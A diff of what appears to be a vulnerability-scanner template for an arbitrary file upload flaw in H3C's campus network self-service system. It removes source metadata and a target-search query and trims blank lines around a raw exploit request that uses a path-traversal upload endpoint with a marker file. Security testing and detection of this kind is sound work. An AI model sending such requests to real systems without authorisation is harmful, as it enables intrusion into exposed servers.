@@ -3,12 +3,8 @@ info:
   name: H3C 校园网自助服务系统 flexfileupload 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/foossczvp19iymh9'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: foossczvp19iymh9
-    fofa: header="/selfservice"
 http:
 - raw:
   - 'POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1
@@ -23,8 +19,6 @@ http:
     Accept-Encoding: gzip
 
 
-
-
     -----------------WebKitFormBoundaryMmx988TUuintqO4Q
 
 
@@ -32,8 +26,6 @@ http:
 
 
     Content-Type: application/octet-stream
-
-
 
 
     dudesite
